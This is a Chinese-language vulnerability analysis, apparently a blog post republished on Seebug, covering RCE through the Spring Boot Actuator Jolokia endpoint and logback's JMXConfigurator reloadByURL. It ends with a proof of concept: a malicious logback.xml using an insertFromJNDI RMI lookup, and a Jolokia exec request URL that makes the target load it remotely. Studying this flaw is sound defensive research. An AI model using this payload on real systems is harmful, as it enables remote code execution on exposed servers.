**作者：Lucifaer  
博客：<https://www.lucifaer.com>**

前段时间看到twitter上有国外的研究人员[Exploiting Spring Boot
Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)这篇文章，打算跟着这篇文章学习一下。作者已经提供了一个[简单的demo](https://github.com/artsploit/actuator-testbed)用于大家调试。这篇是对`ch.qos.logback.classic.jmx.JMXConfigurator`这个利用点的分析，之后还会对rr找到的另外一个利用点进行分析。

### 0x01 什么是Spring Boot Actuator

Actuators（翻译过来应该叫做执行器，但是个人感觉意思并不准确）是Spring
Boot简化Spring开发过程中所提出的四个主要特性中的一个特性，它为Spring
Boot应用添加了一定的管理特性，可以说类似于一个“监控器”一样的东西。Spring Boot Actuator给Spring
Boot带来了很多有用的特性：

  * 管理端点
  * 获取应用信息的”/info”端点
  * 合理的异常处理以及默认的”/error”映射端点
  * 当启用`Spring Security`时，会有一个审计事件框架。

在这些特性中最有用的且最有意思的特性是管理端点，所有的管理节点都可以在`org.springframework.boot.actuate.endpoint`中找到。

在Spring Boot 1-1.4版本，这些端点都是可以直接访问的，不需要认证。在Spring Boot
1.5版本后除了`/health`和`/info`这两个端点，其他的端点都被默认的当做是敏感且安全的端点，但是开发人员经常会禁用此安全性，从而产生安全威胁。

### 0x02 Jolokia端点的大致运行流程

我们都知道Jolokia是一个用来访问远程`JMX
MBeans`的方法，它允许对所有已经注册的MBean进行Http访问。接下来直接看一下`JolokiaMvcEndpoint`这个端点的具体实现。

![img](https://images.seebug.org/content/images/2019/03/14/1552539371000-15519269122243.jpg-w331s)

可以看到直接可以通过`/jolokia`来访问到该端点，`handle`方法用来处理请求：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519270460701.jpg-w331s)

可以跟一下路由处理流程，最后在`org.jolokia.http.HttpRequestHandler#handleGetRequest`这里处理get请求：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519412693894.jpg-w331s)

可以看到红框中通过`JmxRequestFactory`工厂函数来创建了一个`JmxRequest`类，之后执行这个类。在创建这个类的时候回根据get请求的路由来指定具体执行什么样的功能，也就是说请求的参数通过创建不同的`JmxRequest`类来实现不同的方法，那么我们只需要看一下`JmxRequest`的继承关系，看看它有什么继承类就能大致的知道它具备什么样的功能：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519415116175.jpg-w331s)

在继承类中我们发现存在`JmxWriteRequest`和`JmxExecRequest`这两个从名字来说让我们很兴奋的子类，我们知道`/jolokia/list`所执行的是`JmxListRequest`这个子类的功能，类比一下，`/jolakia/exec`就可以执行`JmxExecRequest`这个子类的功能。我们首先来具体看一下这个`JmxExecRequest`子类：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519424535147.jpg-w331s)

在翻阅代码的过程中我注意到了这里，如果你自己跟了一下`JmxRequest`的创建过程的话，就知道首先是根据将请求的路由进行解析，将`/`之后的第一个字符串作为类别在`CREATOR_MAP`中查找是否存在该类别，如果存在则调用`newCreate`方法创建`JmxRequest`。下图为`CREATOR_MAP`：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519427835970.jpg-w331s)

知道了`JmxRequest`的创建过程后，我们来看看它怎么用，这个时候需要跟进一下`executeRequest`方法。

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519450439844.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519451136703.jpg-w331s)

遍历调度器，如果找到相应的调度器则调用调度器：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519458178996.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519461715427.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519459643344.jpg-w331s)

这里转交调度器中相应的请求处理方法来处理：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519463149136.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519463989031.jpg-w331s)

可以看到这里存在`invoke`方法最终会执行我们指定的类中的指定的方法，而指定的类以及指定的方法都是可以通过路由参数来设置的。那么这里是否可以随便设置一个类呢？如果你跟了一遍这个流程的话，你会发现这里你所指定的类是从MBeanServer中来寻找的，当找不到你所设置的类的话，会抛出异常：

![img](https://images.seebug.org/content/images/2019/03/14/1552539372000-15519481493120.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15519481746551.jpg-w331s)

所以也就是说必须要从`/jolokia/list`所展示的MBean中去寻找可以调用的类及方法。

### 0x03 构造请求路由

可以看到所有我们可控点都是通过构造合理的请求完成的，那么如果想要完成攻击的话，就必须知道如何构造合理的请求。

回到`handleGetRequest`这个方法中，我们现在需要仔细来研究一下它是如何把路由变成格式化的参数的，主要关注这两个部分：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15519495192056.jpg-w331s)

这里面有很多正则解析的部分，我比较懒就下断点调了2333….

在动态调之前我们看一下`JmxExecRequest`的数据结构是什么样的：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15519496914281.jpg-w331s)

注意看这段注释，这里会传入四个参数其中有两个参数是不能为空的：

  * pObjectName：要执行操作的MBean的名称，不能为空
  * pOperation：要执行操作的名称（方法的名称），不能为空
  * pArguments：用于执行请求的参数，可以为空
  * pParams：用于处理请求的可选参数

知道了数据结构，我们来看看具体的解析过程。

具体的解析过程在`JmxRequestFactory`这个工厂类中：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522871297117.jpg-w331s)

在`extractElementsFromPath`方法中完成了以`/`分割路由请求，并对路由进行处理的，其中最为重要的点在`split`方法中：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522872206146.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522872422777.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522872677405.jpg-w331s)

解析过程中最为重要的点在于两个正则表表达式：

  * `(.*?)(?:(?<!!)((?:!.)*)/|$)`
  * `!(.)`

这里利用`Pattern.matcher`的正则表达式分组支持的特性，可以为正则表达式提供多次匹配的支持。这里的可以看到当处理的路由中存在`1!/2`这样的情况时，可以保留`/`：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522874419697.jpg-w331s)

然后以此类推将路由以`/`分组，将每个组中的参数保存到一个`ArrayList`中，之后对这个数组进行校验，这里将数组中的第一个元素当做是`type`，在`(R)
getCreator(type)`根据此`type`在`CREATOR_MAP`中查找是否存在此方法：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522876458488.jpg-w331s)

存在的话则调用相应的`newCreator`方法动态创建一个`JmxRequest`对象。这里是`JmxExecRequest`：

![img](https://images.seebug.org/content/images/2019/03/14/1552539373000-15522900538326.jpg-w331s)

可以看到这里将pStack的栈顶移除并将其依次设置成`pObjectName`、`pOperation`。分析到这里我们只需要指定这样的路由就可以调用我们想要调用的类和方法了：

    
    
    jolokia/exec/class_name/function_name/params

### 0x04 寻找可以利用的点

根据上面两节的内容，我们现在可以控制`/exec`端点执行我们想让其执行的类中的方法，但是前提是这个类和方法必须在`/list`节点中存在。文章中说了一个`ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`这个类，跟进看一下：

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522908919940.jpg-w331s)

在`JMXConfigurator`这个类中发现存在一个`reloadByURL`方法，那是不是可以从远程加载一个新的配置文件从而造成RCE呢？感觉是有搞头的。那就着重看一下这个`reloadByURL`方法。

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522918960892.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522919279956.jpg-w331s)

获取输入流，并作为参数执行`doConfigure`方法：

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522919877544.jpg-w331s)

继续跟进:

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522920270026.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522920603923.jpg-w331s)

这里开始解析xml文件，看一下是否有防护：

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522920943832.jpg-w331s)

没有任何防护。也就是说这里是可以引入外部资源，同时解析xml文档的，那么这里起码就有一个ssrf，和一个没有回显的xxe。那么看一下这个所谓的JMX配置文件也就是`logback.xml`有没有什么可以搞的东西。在`logbacks.xml`中有这么一个标签：

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522930494363.jpg-w331s)

这里把`env-entry-name`改为自己的服务器地址就能在目标机上执行任意代码。

### 0x05 poc构造

漏洞分析的话上面的一个章节已经说得非常清楚了，下面我们来探讨以下如何利用这个漏洞，如果想要利用该漏洞的话需要准备以下几个必备条件：

  1. 一个N/D服务（RMI或者LDAP皆可）
  2. 绑定在N/D服务上的恶意类
  3. 一个恶意的logback.xml
  4. 构造一个恶意请求

N/D服务以及恶意类绑定就不过多叙述了，可以看16年bh的演讲，恶意的logback.xml可以构造如下：

    
    
    <configuration>
        <insertFromJNDI env-entry-name="rmi://127.0.0.1:2000/Exploit" as="appName" />
        <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
            <withJansi>true</withJansi>
            <encoder>
                <pattern>[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n</pattern>
            </encoder>
        </appender>
        <root level="info">
            <appender-ref ref="STDOUT" />
        </root>
        <jmxConfigurator/>
    </configuration>

请求的话可以构造如下：

    
    
    http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:9998!/logback.xml

效果如下：

![img](https://images.seebug.org/content/images/2019/03/14/1552539374000-15522997474196.jpg-w331s)

### 0x06 Reference

  * <https://www.veracode.com/blog/research/exploiting-spring-boot-actuators>
  * <https://www.veracode.com/blog/research/exploiting-jndi-injections-java>
  * <https://logback.qos.ch/manual/configuration.html#insertFromJNDI>
  * <https://github.com/artsploit/actuator-testbed>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/850/>

